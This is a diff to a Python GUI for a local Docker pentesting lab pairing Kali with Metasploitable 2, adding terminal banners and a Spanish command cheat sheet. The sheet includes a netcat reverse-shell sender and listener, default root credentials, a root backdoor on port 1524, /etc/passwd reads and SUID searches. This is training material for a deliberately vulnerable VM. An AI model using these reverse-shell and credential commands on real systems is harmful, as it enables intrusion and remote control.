@@ -20,50 +20,97 @@ CONTENEDORES = [
     (META_CONTAINER,  METASPLOITABLE_IMAGE,  "Metasploitable 2", "Máquina intencionalmente vulnerable para práctica"),
 ]
 
+# ── Banners de terminal ───────────────────────────────────────────────
+# Kali:          banner ya integrado en /etc/motd del Dockerfile
+# Metasploitable: se inyecta en /tmp/octolab_motd vía stdin al abrir terminal
+_BANNER_META = (
+    "    __  ___     __                   __      _ __        __    __    ___ \n"
+    "   /  |/  /__  / /_____ __________  / /___  (_) /_____ _/ /_  / /__ |__ \\\n"
+    "  / /|_/ / _ \\/ __/ __ `/ ___/ __ \\/ / __ \\/ / __/ __ `/ __ \\/ / _ \\__/ /\n"
+    " / /  / /  __/ /_/ /_/ (__  ) /_/ / / /_/ / / /_/ /_/ / /_/ / /  __/ __/ \n"
+    "/_/  /_/\\___/\\__/\\__,_/____/ .___/_/\\____/_/\\__/\\__,_/_.___/_/\\___/____/ \n"
+    "                          /_/\n"
+    "\n"
+    "  Contenedor  : octolab-metasploitable\n"
+    "  Red         : octolab-net\n"
+    "  Credenciales: msfadmin / msfadmin  |  root / toor\n"
+    "\n"
+    "  Warning: Never expose this VM to an untrusted network!\n"
+    "\n"
+)
+
+BANNERS: dict[str, str] = {
+    META_CONTAINER: _BANNER_META,
+}
+
 # ── Referencia de comandos ────────────────────────────────────────────
-# (descripción, comando)
+# Herramientas disponibles en octolab-kali: nmap, ncat, curl, wget,
+# python3, ssh, ping, net-tools, dnsutils
 COMANDOS = {
-    ("RE", "#0891b2", "Reconocimiento"): [
-        ("Descubrir hosts en la red",             "nmap -sn 172.18.0.0/16"),
-        ("Escaneo de servicios (puertos comunes)","nmap -sV -p 1-1000 <IP_objetivo>"),
-        ("Escaneo completo de todos los puertos", "nmap -sV -p- <IP_objetivo>"),
-        ("Escaneo con scripts NSE por defecto",   "nmap -sV -sC <IP_objetivo>"),
-        ("Escaneo agresivo (OS + scripts)",        "nmap -A <IP_objetivo>"),
-        ("Detectar vulnerabilidades conocidas",    "nmap --script vuln <IP_objetivo>"),
+    ("RE", "#0891b2", "Reconocimiento — nmap"): [
+        ("Descubrir hosts activos en la red",     "nmap -sn -T4 -n 172.18.0.0/16"),
+        ("Escaneo rápido (100 puertos comunes)",  "nmap -T4 -n -F <IP_objetivo>"),
+        ("Escaneo de puertos y versiones",        "nmap -sS -sV -T4 -n -p 1-1000 <IP_objetivo>"),
+        ("Escaneo completo (todos los puertos)",  "nmap -sS -T4 -n -p- --min-rate 5000 <IP_objetivo>"),
+        ("Scripts NSE de un servicio concreto",   "nmap -T4 -n -p 21 --script ftp* <IP_objetivo>"),
+        ("Scripts NSE HTTP",                      "nmap -T4 -n -p 80 --script http-* <IP_objetivo>"),
     ],
-    ("MS", "#7c3aed", "Metasploit Framework"): [
-        ("Iniciar el framework",                  "msfconsole"),
-        ("Buscar módulos o exploits",             "search <término>"),
-        ("Seleccionar un módulo",                 "use <ruta/del/módulo>"),
-        ("Ver opciones del módulo activo",        "show options"),
-        ("Configurar IP del objetivo",            "set RHOSTS <IP_objetivo>"),
-        ("Configurar IP del atacante",            "set LHOST <IP_kali>"),
-        ("Ejecutar el módulo",                    "run"),
-        ("Listar sesiones activas",               "sessions -l"),
-        ("Conectar a una sesión Meterpreter",     "sessions -i <ID>"),
+    ("CN", "#0891b2", "Conexiones y Banners — ncat"): [
+        ("Capturar banner de cualquier servicio", "ncat <IP_objetivo> <puerto>"),
+        ("Conectar a FTP  (prueba anonymous)",    "ncat <IP_objetivo> 21"),
+        ("Conectar a Telnet",                     "ncat <IP_objetivo> 23"),
+        ("Conectar a IRC  (puerto 6667)",         "ncat <IP_objetivo> 6667"),
+        ("Escucha para recibir reverse shell",    "ncat -lvp 4444"),
+        ("Enviar reverse shell al oyente",        "ncat <IP_kali> 4444 -e /bin/bash"),
     ],
-    ("EX", "#dc2626", "Exploits — Metasploitable 2"): [
-        ("vsftpd 2.3.4 backdoor  (puerto 21)",    "use exploit/unix/ftp/vsftpd_234_backdoor"),
-        ("Samba usermap_script   (puerto 445)",   "use exploit/multi/samba/usermap_script"),
-        ("DistCC exec            (puerto 3632)",  "use exploit/unix/misc/distcc_exec"),
-        ("UnrealIRCd backdoor    (puerto 6667)",  "use exploit/unix/irc/unreal_ircd_3281_backdoor"),
-        ("Tomcat manager upload  (puerto 8180)",  "use exploit/multi/http/tomcat_mgr_upload"),
-        ("Fuerza bruta SSH",                      "use auxiliary/scanner/ssh/ssh_login"),
+    ("WB", "#7c3aed", "Web — curl"): [
+        ("Cabeceras HTTP del servidor",           "curl -I http://<IP_objetivo>/"),
+        ("Página principal",                      "curl http://<IP_objetivo>/"),
+        ("DVWA (app vulnerable incluida)",        "curl http://<IP_objetivo>/dvwa/"),
+        ("Mutillidae (app vulnerable incluida)",  "curl http://<IP_objetivo>/mutillidae/"),
+        ("Tomcat manager  (puerto 8180)",         "curl http://<IP_objetivo>:8180/manager/html"),
+        ("phpMyAdmin",                            "curl http://<IP_objetivo>/phpmyadmin/"),
     ],
-    ("PE", "#059669", "Post-explotación"): [
+    ("SS", "#059669", "SSH — credenciales por defecto"): [
+        ("Conectar como msfadmin",                "ssh msfadmin@<IP_objetivo>"),
+        ("Conectar como root",                    "ssh root@<IP_objetivo>"),
+        ("Deshabilitar comprobación de clave",    "ssh -o StrictHostKeyChecking=no msfadmin@<IP_objetivo>"),
+        ("Comprobar versión SSH",                 "nmap -T4 -n -p 22 -sV <IP_objetivo>"),
+    ],
+    ("PE", "#dc2626", "Post-explotación"): [
         ("Ver usuario actual",                    "whoami"),
-        ("Ver UID / GID del usuario",             "id"),
+        ("Ver UID / GID",                         "id"),
         ("Información del sistema operativo",     "uname -a"),
-        ("Obtener shell TTY interactiva",         "python -c 'import pty; pty.spawn(\"/bin/bash\")'"),
+        ("Shell TTY interactiva con python3",     "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
         ("Ver usuarios del sistema",              "cat /etc/passwd"),
-        ("Buscar binarios SUID (escalada)",       "find / -perm -4000 2>/dev/null"),
+        ("Binarios SUID  (posible escalada)",     "find / -perm -4000 2>/dev/null"),
+        ("Interfaces de red",                     "ip a"),
+        ("Conexiones activas",                    "ss -antp"),
     ],
-    ("RD", "#4f46e5", "Red y Docker"): [
-        ("IP de Metasploitable en la red interna",
+    ("RD", "#4f46e5", "Red interna"): [
+        ("Verificar conectividad",                "ping -c 4 <IP_objetivo>"),
+        ("Ver IP de Kali en la red",              "ip a | grep 172"),
+        ("Resolución DNS inversa",                "nslookup <IP_objetivo>"),
+        ("IP de Metasploitable  (host Windows)",
          f"docker inspect -f '{{{{.NetworkSettings.Networks.{DOCKER_NETWORK}.IPAddress}}}}' {META_CONTAINER}"),
-        ("IP de Kali en la red interna",
+        ("IP de Kali  (host Windows)",
          f"docker inspect -f '{{{{.NetworkSettings.Networks.{DOCKER_NETWORK}.IPAddress}}}}' {KALI_CONTAINER}"),
-        ("Comprobar conectividad con el objetivo","ping -c 4 <IP_objetivo>"),
+    ],
+    ("M2", "#dc2626", "Metasploitable 2 — Servicios y backdoors"): [
+        ("Escanear todos los servicios conocidos",   "nmap -sS -sV -T4 -n -p 21,22,23,25,80,139,445,1524,3306,5432,5900,6667,8180 <IP_meta>"),
+        ("Ingreslock — shell root directa (1524)",   "ncat <IP_meta> 1524"),
+        ("FTP — login anónimo",                      "ncat <IP_meta> 21"),
+        ("Telnet — acceso interactivo",              "ncat <IP_meta> 23"),
+        ("IRC — UnrealIRCd (puerto 6667)",           "ncat <IP_meta> 6667"),
+        ("Distcc — verificar exposición (3632)",     "nmap -T4 -n -p 3632 -sV <IP_meta>"),
+    ],
+    ("MW", "#7c3aed", "Metasploitable 2 — Aplicaciones web"): [
+        ("Listar títulos de servicios HTTP",         "nmap -T4 -n -p 80,8180,8080 --script http-title <IP_meta>"),
+        ("Tomcat manager (tomcat:tomcat)",            "curl -u tomcat:tomcat http://<IP_meta>:8180/manager/html"),
+        ("DVWA — formulario de login",               "curl http://<IP_meta>/dvwa/login.php"),
+        ("Mutillidae",                               "curl http://<IP_meta>/mutillidae/"),
+        ("phpMyAdmin (root sin contraseña)",          "curl http://<IP_meta>/phpmyadmin/"),
+        ("MySQL — verificar acceso remoto",          "nmap -T4 -n -p 3306 -sV <IP_meta>"),
     ],
 }
 
@@ -270,6 +317,7 @@ class LabsScreen(ctk.CTkFrame):
         if ip_lbl:
             ip_lbl.configure(text=f"IP red interna: {ip}" if ip else "")
 
+        # En error: solo Iniciar activo (para reintentar)
         self._set_btn_enabled(self._start_frames.get(nombre), not running)
         self._set_btn_enabled(self._term_frames.get(nombre),  running)
         self._set_btn_enabled(self._stop_frames.get(nombre),  running)
@@ -281,6 +329,12 @@ class LabsScreen(ctk.CTkFrame):
 
     # ── Acciones ─────────────────────────────────────────────────────
     def _iniciar(self, nombre: str, imagen: str):
+        def on_status(msg: str):
+            # Muestra el mensaje de progreso en la etiqueta de estado (hilo secundario → after)
+            self.after(0, lambda m=msg: self.estado_labels[nombre].configure(
+                text=m[:52] + "…" if len(msg) > 52 else m,
+                text_color=C["muted"]))
+
         def tarea():
             self.after(0, lambda: self.estado_labels[nombre].configure(
                 text="Iniciando...", text_color=C["muted"]))
@@ -289,7 +343,7 @@ class LabsScreen(ctk.CTkFrame):
                 self._set_btn_enabled(self._term_frames.get(nombre),  False),
                 self._set_btn_enabled(self._stop_frames.get(nombre),  False),
             ])
-            ok = self.docker.lanzar_contenedor(nombre, imagen)
+            ok = self.docker.lanzar_contenedor(nombre, imagen, on_status=on_status)
             ip = self.docker.get_ip_contenedor(nombre) if ok else None
             self.after(0, lambda: self._set_estado(nombre, "running" if ok else "error", ip))
         threading.Thread(target=tarea, daemon=True).start()
@@ -306,10 +360,24 @@ class LabsScreen(ctk.CTkFrame):
 
     def _abrir_terminal(self, nombre: str):
         try:
-            subprocess.Popen(
-                ["cmd.exe", "/k", f"docker exec -it {nombre} /bin/bash"],
-                creationflags=subprocess.CREATE_NEW_CONSOLE
-            )
+            banner = BANNERS.get(nombre)
+            if banner:
+                # Inyectar banner en /tmp/octolab_motd vía stdin — sin quoting ni escaping
+                subprocess.run(
+                    ["docker", "exec", "-i", nombre, "bash", "-c",
+                     "cat > /tmp/octolab_motd"],
+                    input=banner.encode("utf-8"),
+                    capture_output=True,
+                    timeout=5,
+                )
+                motd_cmd = "cat /tmp/octolab_motd 2>/dev/null; exec bash"
+            else:
+                # Kali: banner ya está en /etc/motd del Dockerfile
+                motd_cmd = "cat /etc/motd 2>/dev/null; exec bash"
+
+            # String directo a CreateProcess — cmd.exe maneja las comillas sin escaping roto
+            cmd = f'cmd.exe /k docker exec -it {nombre} bash -c "{motd_cmd}"'
+            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
         except Exception as e:
             print(f"Error abriendo terminal: {e}")
 
